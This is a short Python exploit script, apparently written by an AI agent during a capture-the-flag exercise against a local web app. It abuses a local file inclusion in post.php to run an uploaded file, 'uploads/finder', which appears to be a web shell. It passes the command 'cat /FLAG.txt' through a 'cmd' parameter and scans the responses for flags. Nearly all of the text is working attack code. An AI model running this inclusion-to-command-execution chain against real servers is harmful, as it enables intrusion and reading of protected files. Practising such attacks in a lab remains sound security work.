import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Including uploads/finder to see full response...")

resp = requests.get(f"{base_url}/post.php", params={'id': 'uploads/finder'})

print(f"Full response (length {len(resp.text)}):")
print(resp.text)
print("\n" + "="*80 + "\n")

# Check for FLAG pattern
flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
if flags:
    print(f"[!!!] FOUND FLAGS:")
    for flag in flags:
        print(f"  {flag}")
else:
    print("No FLAG{} pattern found in response")
    
# Check if there's any way to interact with the included file
print("\n[+] The finder.php is now executing through the LFI context.")
print("[+] Let me check if query parameters from the original request affect it...")

# Try adding additional parameters
resp2 = requests.get(f"{base_url}/post.php", params={
    'id': 'uploads/finder',
    'cmd': 'cat /FLAG.txt'
})

print(f"\nWith cmd parameter (length {len(resp2.text)}):")
if len(resp2.text) != len(resp.text):
    print("Different response!")
    print(resp2.text)
elif "FLAG{" in resp2.text:
    print(resp2.text)
else:
    print("Same response as before")

